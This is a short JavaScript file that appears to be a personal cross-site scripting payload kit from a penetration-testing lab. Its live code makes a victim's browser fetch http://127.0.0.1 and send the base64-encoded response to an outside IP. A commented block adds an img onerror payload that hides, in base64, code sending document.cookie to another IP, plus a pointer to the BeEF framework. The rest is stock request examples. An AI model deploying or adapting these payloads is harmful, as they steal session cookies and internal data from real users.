const req = new XMLHttpRequest();
req.open("GET", "http://127.0.0.1", false);
req.send();
response=req.responseText;

const req2 = new XMLHttpRequest();
req2.open("GET", "http://10.10.15.70/RESPONSE=" + btoa(response), false);
req2.send();


/*
// Example Get Request
const req = new XMLHttpRequest();
req.open("GET", "http://127.0.0.1", true);
req.onload = () => {
  // Request finished. Do processing here.
};
req.send(null);
// req.send('string');
// req.send(new Blob());
// req.send(new Int8Array());
// req.send(document);
*/

/*
// Example Post Request
const req3 = new XMLHttpRequest();
req3.open("POST", "/server", true);
// Send the proper header information along with the request
req3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req3.onreadystatechange = () => {
  // Call a function when the state changes.
  if (req3.readyState === XMLHttpRequest.DONE && req3.status === 200) {
    // Request finished. Do processing here.
  }
};
req3.send("foo=bar&lorem=ipsum");
// req3.send(new Int8Array());
// req3.send(document);


<img src='x' onerror=eval(atob('Y29uc3QgcmVxMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpyZXEyLm9wZW4oIkdFVCIsICJodHRwOi8vMTAuMTAuMTQuMjM0L1JFU1BPTlNFPSIgKyBidG9hKGRvY3VtZW50LmNvb2tpZSksIGZhbHNlKTsKcmVxMi5zZW5kKCk7Cg==')); />
base64 is just this file.... well the call back part up top


also don't forget about beef-xss
*/
